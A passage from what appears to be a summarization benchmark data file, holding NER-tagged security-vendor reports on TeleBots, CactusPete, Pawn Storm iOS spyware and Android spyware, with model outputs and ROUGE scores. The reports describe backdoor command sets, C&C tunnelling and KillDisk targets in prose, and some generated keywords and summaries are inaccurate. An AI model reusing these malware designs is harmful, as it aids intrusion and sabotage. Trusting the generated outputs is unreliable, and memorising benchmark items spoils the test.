Base64 encoded . But what really makes this backdoor interesting is the way in which it communicates with attackers in order to receive commands . Python / [ORG] TeleBot abuses the [ORG] Telegram Bot API from [PERSON] Telegram [PERSON] Messenger to communicate with the attackers . The Telegram Bot API is based on HTTP and to a network administrator within a compromised network , the communication between the infected computer and the attackers will look like HTTP(S ) communication with a legitimate server , speci\ufb01cally   api.telegram.org . We have informed Telegram of this abuse of their communication platform . Figure [CARDINAL] 4 : The Python / TeleBot . AA malware code that uses Telegram Bot API.Each of the samples we discovered has a unique token embedded in its code , which means that each sample uses its own [PERSON] Telegram [PERSON] Messenger account . Python / [ORG] TeleBot uses private chats for communicating with the cybercriminals . This scheme allows the control of infected computers through any device with [PERSON] Telegram [PERSON] Messenger installed , even from a smartphone , just by issuing commands via chat . The Python / TeleBot malware has support for following commands : [ORG] Purpose [ORG] Executes shell command and sends result in chat Executes shell command but does not send result in chat Uploads picture from infected computer to chat Uploads any type of \ufb01le [CARDINAL] up [CARDINAL] to 50 MB in size to chat [ORG] Command [ORG] forcecheckin|| [ORG] % random% Collects Windows version , platform ( x64 or x86 ) , current privileges time|| % seconds% ss||Changes interval between execution of commands [PERSON] Captures screenshot ( not implemented)In addition , the malware automatically saves all incoming \ufb01les from the attacker to its own folder . By this   means , attackers can push additional malicious tools to an infected computer . During our research , we were able to \ufb01nd a [ORG] Telegram account belonging to [CARDINAL] one of the attackers . Figure [CARDINAL] 5 : Pro\ufb01le of [CARDINAL] one of the attackers in [PERSON] Telegram [PERSON] Messenger . It should be noted that the Telegram Bot API was not the only legitimate protocol that was used by these attackers . We have seen [CARDINAL] at [CARDINAL] least [CARDINAL] one sample of this backdoor that uses an outlook.com mailbox as C&C.Password stealing malicious toolsAfter successful compromise of the network , attackers use various malicious tools in order to collect passwords , allowing them to subsequently perform a lateral movement within the compromised LAN.A string , that contains a [ORG] PDB - path to debug symbols , suggests [CARDINAL] one such tool was named CredRaptor by the attackers . This tool collects saved passwords from various browsers such as [PERSON] Google [PERSON] Chrome , Internet Explorer , [ORG] Mozilla [ORG] Firefox , and [ORG] Opera . Figure [CARDINAL] 6 : PDB - Path reveals the name of the password stealer . The attackers are using a tool with name plainpwd in order to dump Windows credentials from memory . This tool is a slightly modi\ufb01ed version of the open - source project   mimikatz . In addition to plainpwd and CredRaptor the toolkit includes a keylogger . The keylogger uses a standard technique to capture keystrokes , speci\ufb01cally the   SetWindowsHookEx function . In order to also sni\ufb00 passwords in network tra\ufb03c , the attackers use a console version of Interceptor - NG .     Since it requires [PRODUCT] WinPcap drivers to be installed , the attackers made a custom tool to install them silently . Figure [CARDINAL] 7 : Intercepter - NG password sni\ufb03ng tool .   The combined use of all these tools allows attackers to gain a foothold in a compromised network , with the objective of gaining full control by obtaining domain administrator privileges . LDAP query toolAnother interesting discovery was a tool that was used during attacks to make queries to [ORG] Active [ORG] Directory using LDAP . This tool is able to dump detailed information about computers and usernames listed in [FAC] Active [FAC] Directory , and is tailored for a speci\ufb01c victim \u2019s domain . Figure [CARDINAL] 8 : Disassembled code of the tailored LDAP query tool . Additional backdoorFurther research revealed that the attackers deployed additional backdoors in order to regain access to the compromised network , should their main Python / TeleBot backdoor be discovered and removed . This additional backdoor is written in VBS and some samples we discovered were packaged using the script2exe program . Figure [CARDINAL] 9 : Source code of additional backdoor written in [CARDINAL] VBS.There are several samples of this VBS backdoor , but all of them have pretty straightforward functionality . The backdoor sends the computer name and [ORG] MAC address of the computer executing it to its [ORG] C&C server using HTTP . The variable timeout de\ufb01nes the period of time in minutes between calls to the server . The   server can push additional commands for execution . Here is a list of supported commands : [ORG] Command [ORG] Executes shell command and sends results back to the server Executes shell command but does not send result back to the server DecodesBase64 data and saves it to % TEMP% folder De\ufb01nes a new timeout between calls to server   Quits Quits and deletes itself Uploads \ufb01le from agent computer to [ORG] C&C server [ORG] BCS - serverThe attackers also used a malicious tool that they named [ORG] BCS - server . This tool allows them to open a tunnel into an internal network and then this tunnel can be used to send and receive data between the [ORG] C&C server and even non - infected computers in the network . The main idea of this tool is based on the same principles as the [ORG] XTUNNEL malware used by the [ORG] Sednit group . During our analysis we discovered that the attackers used a guide for this speci\ufb01c tool . Interestingly , the   guide was written in [LANGUAGE] Russian . Figure [CARDINAL] 10 : Guide for [ORG] BCS - server in [LANGUAGE] Russian . The guide in [NORP] Russian can be roughly translated as : Parameters \ufb01le So attackers specify an external [ORG] C&C server in the command line and the tool connects to this server using HTTP . This remote server is used as a proxy by attackers : the connection that goes to this server is redirected to the internal network by the tool and any response that the tool gets from a computer in the internal network goes to the [ORG] C&C server . Thus , attackers can communicate with internal servers that are normally unreachable from the internet . The communication tra\ufb03c between the [ORG] BCS - server tool and the [ORG] C&C server is base64 encoded and    encapsulated in HTML tags . Figure [CARDINAL] 11 : The captured handshake of [ORG] BCS - server tool and [ORG] C&C server . KillDiskThe [PRODUCT] KillDisk is a destructive component that is used by these attackers as the \ufb01nal stage of an attack .   Previous versions of this component were used in attacks against media companies in [DATE] November [DATE] 2015 and against power grid companies in [GPE] Ukraine in [DATE] December [DATE] 2015.KillDisk is designed to run with high privileges , this time it registers itself as a service under Plug - And- Play Support name . Since at the \ufb01nal stage attackers have probably collected network administrator   level credentials , that \u2019s why they are using Microsoft PsExec in order to execute [PRODUCT] KillDisk with the highest possible privileges on servers and workstations . The attackers may specify an activation date of [PRODUCT] KillDisk via the command line . However , [CARDINAL] one of the samples had a prede\ufb01ned activation time that is set to [CARDINAL] 9:30am , [DATE] 6 [DATE] December [DATE] 2016 . There are improvements in the code , however the main idea of [ORG] KillDisk has n\u2019t change so much \u2013 it deletes important system \ufb01les and makes computer unbootable . Beside that it also overwrites \ufb01les with speci\ufb01c \ufb01le      extensions \u2013 those de\ufb01ned by the malware authors in this version of [PRODUCT] KillDisk are : .kdbx .bak .back .dr .bkf .cfg .fdb .mdb .accdb .gdb .wdb .csv .sdf .myd .dbf .sql .edb .mdf .ib .db3 .db4 .accdc .mdbx .sl3 .sqlite3 .nsn .dbc .dbx .sdb .ibz .sqlite .pyc .dwg .3ds .ai .conf .my .ost .pst .mkv .mp3 .wav .oda .sh .py .ps .ps1 .php .aspx .asp .rb .js .git .mdf .pdf .djvu .doc .docx .xls .xlsx .jar .ppt .pptx .rtf .vsd .vsdx .jpeg .jpg .png .ti\ufb00 .msi .zip .rar .7z .tar .gz .eml .mail .ml .ova .vmdk .vhd .vmem .vdi   .vhdx .vmx .ovf .vmc .vmfx .vmxf .hdd .vbox .vcb .vmsd .vfd .pvi .hdd .bin .avhd .vsv .iso .nrg .disk .hdd .pmf .vmdk .xvdThe [PRODUCT] KillDisk malware may create new , small \ufb01les instead of deleted ones with the exact same \ufb01lename and    these new \ufb01les will contain [CARDINAL] one of [CARDINAL] two strings   mrR0b07 or fS0cie7y instead of the original content . Thisis not the only reference to the Mr. [PERSON] Robot TV show , in addition this [PRODUCT] KillDisk variant displays the picture that is illustrated in Figure 12.Figure [CARDINAL] 12 : Picture displayed by [ORG] KillDisk component . Interestingly , the [PRODUCT] KillDisk malware does not store this picture anywhere : rather it has code that draws this picture in real - time using the Windows GDI . It looks like attackers put a lot of e\ufb00ort just to make the code   that draws this picture . ConclusionThe cybercriminals behind these targeted attacks demonstrate serious intention to conduct cybersabotage attacks . To be able to mount such attacks , they are constantly inventing new malware and techniques , such as the use of the Telegram Bot API instead of a more conventional [ORG] C&C server for example . Special analysis . Indicators of Compromise ( IoC)TeleBots IoCs are also available on ESET \u2019s GitHub repository . ESET detection names : [ORG] VBA / [ORG] TrojanDropper . Agent . SD trojan Win32 / [ORG] TrojanDownloader . Agent . [ORG] CWY trojan Python / [ORG] TeleBot . AA trojan Python / Agent . Q trojan Python / Agent . AE trojan Python / Agent . AD trojan VBS / Agent . [PERSON] AQ trojan VBS / Agent . [ORG] AO trojan VBS / Agent . [ORG] AP trojan Win32 / HackTool . [ORG] NetHacker . N trojan Win32 / HackTool . [ORG] NetHacker . O trojan Win32 / PSW.Agent . OCO trojan Win64 / Riskware . Mimikatz . H application Win32 / [PRODUCT] RiskWare . Mimikatz . I application Win32 / PSW.Delf . OQU trojan Win32 / PSW.Agent . [ORG] OCP trojan Win64 / Spy . [ORG] KeyLogger . G trojan Win32 / [PRODUCT] KillDisk . [ORG] NBH trojan Win32 / [PRODUCT] KillDisk . [ORG] NBI trojanC&C [ORG] SHA-1:7FC462F1734C09D8D70C6779A4F1A3E6E2A9CC9F C361A06E51D2E2CD560F43D4CC9DABE765536179Win32 / TrojanDownloader . Agent . [ORG] CWY SHA-1 : F1BF54186C2C64CD104755F247867238C8472504Python / [PERSON] TeleBot . AA backdoor [ORG] SHA-1:16C206D9CFD4C82D6652AFB1EEBB589A927B041B SHA-1 : F00F632749418B2B75CA9ECE73A02C485621C3B4 SHA-1:4B692E2597683354E106DFB9B90677C9311972A1 SHA-1 : B0BA3405BB2B0FA5BA34B57C2CC7E5C184D86991 SHA-1:81F73C76FBF4AB3487D5E6E8629E83C0568DE713CredRaptor SHA-1 : FFFC20567DA4656059860ED06C53FD4E5AD664C2 58A45EF055B287BAD7B81033E17446EE6B682E2DWin64 / Spy . [ORG] KeyLogger . G trojan SHA-1:7582DE9E93E2F35F9A63B59317EBA48846EEA4C7Intercepter - NG SHA-1:64CB897ACC37E12E4F49C4DA4DFAD606B3976225 [ORG] A0B9A35675153F4933C3E55418B6566E1A5DBF8AWin32 / KillDisk SHA-1:71A2B3F48828E4552637FA9753F0324B7146F3AF 8EB8527562DDA552FC6B8827C0EBF50968848F1A28LikeLikeWhats appYou might also be interested in : Modern attacks on [NORP] Russian \ufb01nancial institutions [ORG] Stegano exploit kit poisoning pixelsDorkbot : Life after disruptionAvalanche takedown : Check if you are safeFollow newsletterThe latest security news direct to your inboxEmail SubmitAbout UsContact UsHomeHow ToExpert OpinionVideosPapersOur ExpertsVirus RadarSitemapPrivacy policyLegal InformationCOPYRIGHT \u00a9 [DATE] 2016 ESET , ALL RIGHTS RESERVED .", "generated_text": "the report; ESET researchers; cyberattacks; Ukraine; the BlackEnergy; 2013; the macro; a trojan downloader; GCat; Python; the BlackEnergy malware; the backdoor; the malware; the attacks; December 2015; January 2016; the BlackEnergy group; this group; the spearphishing emails; Excel documents; malicious macros; a backdoor; GCat; Russian; the malware; a backdoor; a trojan; a trojan downloader; the backdoor; GCat; the macro; the Gcat backdoor; the C2; tc; analysis; the malware; the spearphishing emails; the macro; exploits; infrastructure; the macro code; similarities; the BlackEnergy group; The macro; IOCs; the ATT&CK; the attacks; Ukraine; targets.", "ref_text": "<START-1>The report analyzes attacks by a threat actor group called TeleBots against financial institutions in Ukraine in 2016. TeleBots is believed to have evolved from the BlackEnergy group responsible for attacks on Ukraine's energy sector in 2015-2016. The initial infection vector is spear-phishing emails containing Excel docs with malicious macros. The macros drop malware that retrieves a Python-based backdoor called TeleBot. This backdoor abuses Telegram's bot API to communicate with the attackers. TeleBot can execute commands, upload files, and take screenshots. It drops other tools like password stealers, keyloggers, and network sniffers to facilitate lateral movement and data theft. A separate VBS backdoor is also deployed as backup access. The end goal is deployment of KillDisk, a wiper malware that destroys critical system files to render computers inoperable. KillDisk was used in prior BlackEnergy attacks. Attribution is difficult as TeleBots uses some TTPs that overlap with BlackEnergy. But the new backdoors, infrastructure, and targeting indicate it is a distinct, more active evolution of BlackEnergy focused on sabotage. The report provides indicators of compromise and recommendations on blocking malicious macros, securing credentials, monitoring network traffic, and detecting malware to defend against TeleBots. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.432601880877743, "gpt3/lexical/rouge_rouge2": 0.11356466876971609, "gpt3/lexical/rouge_rougeL": 0.21316614420062693, "gpt3/lexical/rouge_rougeLsum": 0.21316614420062693, "gpt3_generated_text": ["In the second half of 2016, ESET researchers uncovered a malicious toolset used in targeted cyberattacks against high-value targets in the Ukrainian financial sector, believed to be the work of a group known as TeleBots. This group bears similarities to the BlackEnergy group, particularly in their use of spearphishing emails with malicious macros to infect victims. The malicious macro drops a trojan downloader written in the Rust programming language, which then downloads and executes a Python backdoor known as Python/TeleBot. This backdoor, obfuscated and packed into a standalone executable using PyInstaller, communicates with attackers through the Telegram Bot API. The TeleBots group is thought to have evolved from the BlackEnergy group, continuing their malicious activities through sophisticated malware and strategic cyberattacks."]}, {"split_name": "test", "sample_id": "test_83", "prompt_text": "Extract the keywords: [ORG] 8/14/2020CactusPete [ORG] APT group \u2019s updated [ORG] Bisonal backdoor | SecurelistCactusPete [ORG] APT group \u2019s updated [ORG] Bisonal [ORG] backdoorsecurelist.com/cactuspete-apt-groups-updated-bisonal-backdoor/97962Konstantin [ORG] ZykovCactusPete ( also known as [PERSON] Karma [PERSON] Panda or [ORG] Tonto [ORG] Team ) is an [ORG] APT group that has been publicly known since at least 2013 . Some of the group \u2019s activities have been previously described in public by multiple sources . We have been investigating and privately reporting on this group \u2019s activity for [DATE] years as well . Historically , their activity has been focused on military , diplomatic and infrastructure targets in [LOC] Asia and [LOC] Eastern [LOC] Europe . This is also true of the group \u2019s latest activities . A new [ORG] CactusPete campaign , spotted at [DATE] the [DATE] end [DATE] of [DATE] February [DATE] 2020 by [ORG] Kaspersky , shows that the group \u2019s favored types of target remain the same . The victims of the new variant of the Bisonal backdoor , according to our telemetry , were from financial and military sectors located in [LOC] Eastern [LOC] Europe . Our research started from [CARDINAL] only [CARDINAL] one sample , but by using [ORG] the [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine ( KTAE ) we found 300 + almost identical samples . All of them appeared [DATE] between [DATE] March [DATE] 2019 and [DATE] April [DATE] 2020 . This underlines the speed of [ORG] CactusPete \u2019s development \u2013 [CARDINAL] more [CARDINAL] than [CARDINAL] 20 [CARDINAL] samples [CARDINAL] per [CARDINAL] month . The target location forced the group to use a hardcoded [PERSON] Cyrillic codepage during string manipulations . This is important , for example , during remote shell functionality , to correctly handle the Cyrillic output from executed commands . The method of malware distribution for the new campaign remains unknown , but previous campaigns indicate that it \u2019s their usual way of distributing malware . The attackers \u2019 preferred way to deliver malware is spear - phishing messages with \u201c magic \u201d attachments . The attachments never contain zero - day exploits , but they do include recently discovered and patched vulnerabilities , or any other crafty approaches that might help them deliver the payload . Running these attachments leads to infection . Once the malware starts it tries to reach a hardcoded C2 . The communication takes place using the unmodified HTTP - based protocol , the request and response body are RC4- encrypted , and the encryption key is also hardcoded into the sample . As the result of the RC4 encryption may contain binary data , the malware additionally encodes it in BASE64 , to match the HTTP specification.1 url handshake consists of several steps : initial request , victim network details and a more detailed victim information request . This is the complete list of victim specific information that is sent to the C2 during the handshake steps : Hostname , [ORG] IP and [ORG] MAC address ; Windows version ; [ORG] Time set on infected host;url [ORG] APT group \u2019s updated [ORG] Bisonal backdoor | [ORG] SecurelistFlags that indicates if the malware was executed on [ORG] VMware environment ; [PERSON] Proxy usage flag ; System default CodePage Identifier;After the handshake has been completed , the backdoor waits for a command , periodically pinging the C2 server . The response body from the [CARDINAL] C2 ping might hold the command and parameters ( optionally ) . The updated Bisonal backdoor version maintains functionality similar to past backdoors built from the same codebase : Execute a remote shell ; Silently start a program on a victim host ; Retrieve a list of processes from the victim host ; Terminate any process ; Upload / Download / Delete files to / from victim host ; Retrieve a list of available drives from the victim host ; Retrieve a filelist of a specified folder from the victim host;This is what it looks like in code . Screenshot of the [CARDINAL] C2 command handling subroutineThis set of remote commands helps the attackers study the victim environment for lateral movement and deeper access to the target organization . The group continues to push various custom [LOC] Mimikatz variants and keyloggers for credential harvesting purposes , along with privilege escalation malware . What are they looking for?Since the malware contains mostly information gathering functionality , most likely they hack into organizations to gain access to the victims \u2019 sensitive data . If we recall that [ORG] CactusPete targets military , diplomatic and infrastructure organizations , the information could be very sensitive indeed . We would suggest the following countermeasures to prevent such threats : Network monitoring , including unusual behavior detection;url [ORG] APT group \u2019s updated [ORG] Bisonal backdoor | [ORG] SecurelistUp - to - date software to prevent exploitation of vulnerabilities ; Up - to - date antivirus solutions ; Training employees to recognize email - based ( social engineering ) attacks;CactusPete activityCactusPete is a [LANGUAGE] Chinese - speaking cyber - espionage [ORG] APT group that uses medium - level technical capabilities , and the people behind it have upped their game . They appear to have received support and have access to more complex code like [ORG] ShadowPad , which [ORG] CactusPete deployed in [DATE] 2020 . The group \u2019s activity has been recorded since [CARDINAL] at [CARDINAL] least [CARDINAL] 2013 , although [NORP] Korean public resources mark an even earlier date \u2013 [DATE] 2009 . Historically , [ORG] CactusPete targets organizations within a limited range of countries \u2013 [GPE] South [GPE] Korea , [GPE] Japan , the [GPE] US and [GPE] Taiwan . [DATE] Last year \u2019s campaigns show that the group has shifted towards other [NORP] Asian and [NORP] Eastern [NORP] European organizations . Here \u2019s an overview of [ORG] CactusPete activity in [DATE] recent [DATE] years , based on [ORG] Kaspersky research results : [DATE] May [DATE] 2018 : a new wave of targeted attacks abusing CVE-2018 - 8174 ( this exploit has been associated with the [ORG] DarkHotel [ORG] APT group , as described on [NORP] Securelist ) , with diplomatic , defense , manufacturing , military and government targets in [LOC] Asia and [LOC] Eastern [LOC] Europe ; [DATE] December [DATE] 2018 and [DATE] early [DATE] 2019 : Bisonal backdoor modification with a set of spying payloads in a campaign targeting organizations within mining , defense , government and technology research targets in [LOC] Eastern [LOC] Europe and [LOC] Asia ; [DATE] September and [DATE] October [DATE] 2019 : a DoubleT backdoor campaign , targeting military- related and unknown victims ; [DATE] March [DATE] 2019 to [DATE] April [DATE] 2020 : Bisonal backdoor modification in a campaign targeting organizations in financial and military institutions in [LOC] Eastern [LOC] Europe ; [DATE] December [DATE] 2019 to [DATE] April [DATE] 2020 : a modified DoubleT backdoor campaign , targeting telecom and governmental organizations and other victims in [LOC] Asia and [LOC] Eastern [LOC] Europe ; [DATE] Late [DATE] 2019 and [DATE] 2020 : [ORG] CactusPete started to deploy [ORG] ShadowPad malware with victims including government organizations , energy , mining , and defense bodies and telcoms located in [LOC] Asia and [ORG] Eastern Europe;Known alternative names for this [ORG] APT group : [ORG] CactusPete , [PERSON] Karma [PERSON] Panda , [GPE] Tonto [GPE] TeamKnown alternative names for the different payloads used : Bisonal , [PERSON] Curious [PERSON] Korlia , DoubleT , [ORG] DOUBLEPIPE , CALMTHORNEIn the end \u2026 url [ORG] APT group \u2019s updated [ORG] Bisonal backdoor | [ORG] SecurelistWe call [ORG] CatusPete [ORG] an [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) group , but the Bisonal code we analyzed is not that advanced . Yet , interestingly , the [ORG] CactusPete [ORG] APT group has had success without advanced techniques , using plain code without complicated obfuscation and spear - phishing messages with \u201c magic \u201d attachments as the preferred method of distribution . Of course , the group does continuously modify the payload code , studies the suggested victim in order to craft a trustworthy phishing email , sends it to an existing email address in the targeted company and makes use of new vulnerabilities and other methods to inconspicuously deliver the payload once an attachment has been opened . The infection occurs , not because of advanced technologies used during the attack , but because of those who view the phishing emails and open the attachments . Companies need to conduct spear - phishing awareness training for employees in order to improve their computer security knowledge . IoCsPDB path : E:\\vs2010\\new big!\\MyServe\\Debug\\MyServe.pdbMD5 : [CARDINAL] 11B8016045A861BE0518C9C398A79573Related material : [DATE] January 29 , [DATE] 2020 url [DATE] March 5 , [DATE] 2020 url 2019 url [DATE] 2019 / presentations / cds19 - executive - s08 - achievement - unlocked.pdf [DATE] July 31 , [DATE] 2018 url url url [DATE] 2013 url ritable / presentations / file_upload / cle - t04_final_v1.pdfurl", "generated_text": "the Bisonal backdoor; APT; CactusPete; Karma Panda; Tonto Team; Asia; Eastern Europe; the new Bisonal backdoor; compromise; spear-phishing; attachments; the malware; execution; the victim; the C2; C2 commands; command & control; files; files; screenshots; file; the victim host; the Bisonal backdoor; a command; the Bisonal backdoor; the malware; the attackers; use; the same codebase; 2014; the attackers; the same group; the same tactics; phishing emails.", "ref_text": "<START-1>The document is a report by cybersecurity company Kaspersky detailing the activities of an advanced persistent threat (APT) hacking group called CactusPete, also known as Karma Panda or Tonto Team. CactusPete is a Chinese-speaking group that has been active since at least 2013, targeting organizations in Asia and Eastern Europe, especially those in the military, diplomatic, infrastructure, and technology sectors. In February 2020, Kaspersky observed a new campaign by CactusPete using an updated version of their custom malware called Bisonal. The targets were financial and military organizations in Eastern Europe. The updated Bisonal backdoor version maintains functionality similar to past backdoors built from the same codebase. Analysis of the malware revealed it has information stealing capabilities and is controlled via a hardcoded command and control server address. The malware exfiltrates extensive details about the infected system to the C2. CactusPete typically infects victims via spear phishing emails containing malicious document attachments that exploit vulnerabilities to install malware if opened. Kaspersky suggests network monitoring, keeping software updated, using antivirus, and employee awareness training to defend against such threats. The report also provides an overview of CactusPete's activities since 2013, showing continued campaigns distributing various backdoors like Bisonal, DoubleT, and ShadowPad. Their targets have expanded but remain focused on Asia and Eastern Europe. Though CactusPete does not use highly advanced malware, their success relies on crafting convincing phishing emails to reliably compromise targets of interest. Kaspersky suggests companies need to train employees more effectively against such phishing. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5204819277108435, "gpt3/lexical/rouge_rouge2": 0.19854721549636803, "gpt3/lexical/rouge_rougeL": 0.3036144578313253, "gpt3/lexical/rouge_rougeLsum": 0.3036144578313253, "gpt3_generated_text": ["The article discusses the activities of the APT group known as CactusPete, also known as Karma Panda or Tonto Team, which has been active since 2013. The group primarily targets military, diplomatic, and infrastructure organizations in Asia and Eastern Europe. A recent campaign by CactusPete, discovered in February 2020, targeted the financial and military sectors in Eastern Europe. The group uses spear-phishing emails with attachments to distribute their malware, which exploits recently discovered vulnerabilities. Once the malware is executed, it establishes communication with a command and control (C2) server and waits for commands. The malware has various functionalities, including executing a remote shell, starting programs on the victim's host, retrieving lists of processes and drives, and uploading, downloading, and deleting files. The group also deploys custom Mimikatz variants and keyloggers for credential harvesting. The purpose of their activities is likely to gain access to sensitive data. Countermeasures suggested include network monitoring, up-to-date software and antivirus solutions, and employee training to recognize email-based attacks."]}, {"split_name": "test", "sample_id": "test_84", "prompt_text": "Extract the keywords: Pawn Storm Update : iOS Espionage [PERSON] App [PERSON] FoundIn our continued research on Operation Pawn Storm , we found one interesting poisoned pawn \u2014 spyware specifically designed for espionage on iOS devices . While spyware targeting [ORG] Apple users is highly notable by itself , this particular spyware is also involved in a targeted attack . Background of Operation Pawn StormOperation Pawn Storm is an active economic and political cyber - espionage operation that targets a wide range of entities , like the military , governments , defense industries , and the media . The actors of [PERSON] Pawn [PERSON] Storm tend to [ORDINAL] first move a lot of pawns in the hopes they come close to their actual , high profile targets . When they finally successfully infect a high profile target , they might decide to move their next pawn forward : advanced espionage malware . The iOS malware we found is among those advanced malware . We believe the iOS malware gets installed on already compromised systems , and it is very similar to next stage SEDNIT malware we have found for [ORG] Microsoft Windows \u2019 systems . We found [CARDINAL] two malicious iOS applications in Operation Pawn Storm . [CARDINAL] One is called [PERSON] XAgent ( detected as IOS_XAGENT.A ) and the other one uses the name of a legitimate iOS game , MadCap ( detected as [ORG] IOS _ [GPE] XAGENT.B ) . After analysis , we concluded that both are applications related to SEDNIT.The obvious goal of the SEDNIT - related spyware is to steal personal data , record audio , make screenshots , and send them to a remote command - and - control ( [ORG] C&C ) server . As of this publishing , the [ORG] C&C server contacted by the iOS malware is live . Analysis of [PERSON] XAgentThe [PERSON] XAgent app is fully functional malware . After being installed on [EVENT] iOS [EVENT] 7 , the app \u2019s icon is hidden and it runs in the background immediately . When we try to terminate it by killing the process , it will restart almost immediately . Installing the malware into an iOS 8 device yields different results . The icon is not hidden and it also can not restart automatically . This suggests that the malware was designed prior to the release of iOS [CARDINAL] 8 last September [ORG] 2014.Data [ORG] Theft [ORG] CapabilitiesThe app is designed to collect all kind of information on an iOS device . It is able to perform the following routines : Collect text messages Get contact lists Get pictures [ORG] Collect geo - location data [ORG] Start voice recording Get a list of installed apps Get a list of processes Get the Wi - Fi statusC&C CommunicationFigure 1 . XAgent code structureBesides collecting information from the iOS device , the app sends the information out via HTTP . It uses [ORG] POST request to send messages , and GET request to receive commands . [PERSON] Formatted [PERSON] Log [PERSON] MessagesThe malware \u2019s log messages are written in HTML and color coded , making it easier for human operators to read . Error messages tend to be in red , while others are in green as shown in the figure below . Figure [CARDINAL] 2 . Color - coded HTML log messagesA Well - Designed Code StructureWe can see that the code structure of the malware is very organized . The malware looks carefully maintained and consistently updated . The app uses the commands watch , search , find , results , open , and close . Figure [CARDINAL] 3 . XAgent code structureRandomly Generated URIFigure [CARDINAL] 4 . List of base URIsThe full uniform resource identifier ( [ORG] URI ) for [ORG] C&C [ORG] HTTP requests is randomly generated , according to a template agreed upon with the [ORG] C&C server . The base URI can be seen in Figure [CARDINAL] 4 , and parameters are chosen from the list below and appended to the base URI.Figure [CARDINAL] 5 . List of parameters used with URIsHere are corresponding implementations we got during our reversing : Figures [CARDINAL] 6 and 7 . Code for [ORG] URI generationToken [GPE] Format and [ORG] EncodingThe malware uses a token to identify which module is communicating . The token is [PERSON] Base64 encoded data , but padded with a [QUANTITY] 5 - byte random prefix so that it looks like valid Base64 data . See the [ORDINAL] first line \u201c ai= \u201d part in the figure below . Reverse engineering also revealed additional communication functions . Figure [CARDINAL] 8 . Client ( XAgent ) requestFigure [CARDINAL] 9 . HTTP communication functionsFTP [LAW] CommunicationFigure [LAW] 10 . C2 serverThe app is also able to upload files via [ORG] FTP protocol . Figure [CARDINAL] 11 . FTP communication functionsAnalysis of \u201c MadCap\u201d\u201cMadcap \u201d is similar to the [PERSON] XAgent malware , but the former is focused on recording audio . \u201c Madcap \u201d can only be installed on jailbroken devices . Figure [CARDINAL] 12 . Code structure of MadcapPossible Infection MethodsThe exact methods of installing these malware is unknown . However , we do know that the iOS device does n\u2019t have to be jailbroken per se . We have seen [CARDINAL] one instance wherein a lure involving [PERSON] XAgent simply says \u201c [WORK_OF_ART] Tap [WORK_OF_ART] Here [WORK_OF_ART] to [WORK_OF_ART] Install [WORK_OF_ART] the [WORK_OF_ART] Application . \u201d The app uses [ORG] Apple \u2019s ad hoc provisioning , which is a standard distribution method of [ORG] Apple for iOS App developers . Through ad hoc provisioning , the malware can be installed simply by clicking on a link , such as in the picture below . The link will lead to url { BLOCKED}/adhoc / XAgent.plist , a service that installs applications wirelessly . Figure [CARDINAL] 13 . Site used in downloading XAgentThere may be other methods of infection that are used to install this particular malware . [CARDINAL] One possible scenario is infecting an [ORG] iPhone after connecting it to a compromised or infected Windows laptop via a [ORG] USB cable . To learn more about this campaign , you may refer to our report , Operation Pawn Storm Using Decoys", "generated_text": "the iOS malware; XAgent; malicious iOS applications; a legitimate iOS game; MadCap; the XAgent app; systems; Sedanit; the malware; information; contact lists; pictures; geo-location data; screenshots; a remote command-and-control server; a command; C&C communication; GET request; commands; response; data; commands; persistence; commands; volume; data; a list; processes; the OS; iOS 8; 2014; the iOS device; the app; commands; the user; iOS 7; a list; the iOS 8 version; iOS 8 beta; commands; a list; the XAgent app; an iOS 8 device; data; photos; information; the screenshot; the iOS device.", "ref_text": "<START-1>The document discusses a new iOS spyware found related to Operation Pawn Storm, an ongoing cyber-espionage campaign. Pawn Storm typically infects high-value targets after initial mass phishing campaigns. Researchers discovered two iOS malware samples called XAgent and MadCap linked to the Sednit group, which is behind Pawn Storm. The iOS malware is designed to steal data and record audio once installed on compromised devices. XAgent hides its icon and runs persistently on iOS 7 devices. It exfiltrates data like messages, contacts, photos, and device info to a remote command and control server. The malware code is well-structured and maintained. MadCap focuses on recording audio and can only be installed on jailbroken devices. The exact infection methods are unknown but may involve tricking users to tap a link to wirelessly install the malware. The report concludes the iOS malware is advanced espionage tools likely installed after initial network compromises by Pawn Storm actors. The malware continues the group's efforts to target high-profile victims on multiple platforms. Defenders should block the command and control infrastructure. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5103448275862069, "gpt3/lexical/rouge_rouge2": 0.24305555555555558, "gpt3/lexical/rouge_rougeL": 0.3586206896551724, "gpt3/lexical/rouge_rougeLsum": 0.3586206896551724, "gpt3_generated_text": ["This article discusses the discovery of spyware designed for espionage on iOS devices as part of Operation Pawn Storm, an ongoing cyber-espionage operation targeting various entities. The spyware, called XAgent, is installed on compromised systems and is similar to the SEDNIT malware found on Microsoft Windows systems. XAgent is capable of stealing personal data, recording audio, taking screenshots, and sending them to a remote command-and-control server. The article also mentions another malicious iOS application called MadCap, which focuses on recording audio and can only be installed on jailbroken devices. The methods of installing these malware are unknown, but it is not necessary for the iOS device to be jailbroken."]}, {"split_name": "test", "sample_id": "test_85", "prompt_text": "Extract the keywords: in the footsteps of [PERSON] HackingTeamBy [PERSON] Nikita [PERSON] Buchka , [PERSON] Alexey [PERSON] Firsh on [DATE] January 16 , [DATE] 2018 . 10:00 amAt [DATE] the [DATE] beginning [DATE] of [DATE] October [DATE] 2017 , we discovered new [ORG] Android spyware with several features previously unseen in the wild . In the course of further research , we found a number of related samples that point to a long - term development process . We believe the initial versions of this malware were created [DATE] at [DATE] least [DATE] three [DATE] years [DATE] ago \u2013 at [DATE] the [DATE] end [DATE] of [DATE] 2014 . Since then , the implant \u2019s functionality has been improving and remarkable new features implemented , such as the ability to record audio surroundings via the microphone when an infected device is in a speci\ufb01ed location ; the stealing of [ORG] WhatsApp messages via [ORG] Accessibility [ORG] Services ; and the ability to connect an infected device to Wi - Fi networks controlled by cybercriminals . We observed many web landing pages that mimic the sites of mobile operators and which are used to spread the [ORG] Android implants . These domains have been registered by the attackers since [DATE] 2015 . According to our telemetry , that was [DATE] the [DATE] year the distribution campaign was at its most active . The activities continue : the most recently observed domain was registered on [DATE] October 31 , [DATE] 2017 . Based on our [ORG] KSN statistics , there are several infected individuals , exclusively in [GPE] Italy . Moreover , as we dived deeper into the investigation , we discovered several spyware tools for Windows that form an implant for ex\ufb01ltrating sensitive data 